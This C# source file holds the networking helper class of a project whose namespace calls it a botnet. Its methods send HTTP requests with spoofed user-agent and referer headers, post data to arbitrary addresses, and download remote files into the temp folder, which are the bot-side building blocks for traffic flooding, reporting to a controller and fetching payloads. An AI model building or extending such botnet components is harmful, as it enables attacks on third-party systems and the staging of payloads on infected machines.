using System.IO;
using System.Net;

namespace telegraph_botnet_yt
{
    class web
    {
        public static void SendHttpWebRequest(string address, string referer, string useragent)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(address);
            request.Credentials = CredentialCache.DefaultCredentials;
            request.Proxy = null;

            request.UserAgent = useragent;
            request.Referer = referer;

            request.GetResponse();
        }


        public static string SendPOST(string URI, string PostData)
        {
            using (WebClient wc = new WebClient())
            {
                wc.Proxy = null;

                return wc.UploadString(URI, "POST", PostData);
            }
        }

        public static string GetHTML(string URI)
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;

            return wc.DownloadString(URI);
        }

        public static string DownloadFile(string URI)
        {
            string file_name = Path.GetFileName(URI);
            string temp_path = Path.GetTempPath();

            string file_path = Path.Combine(temp_path, file_name);

            WebClient wc = new WebClient();
            wc.Proxy = null;

            wc.DownloadFile(URI, file_path);
            return file_path;
        }
    }
}
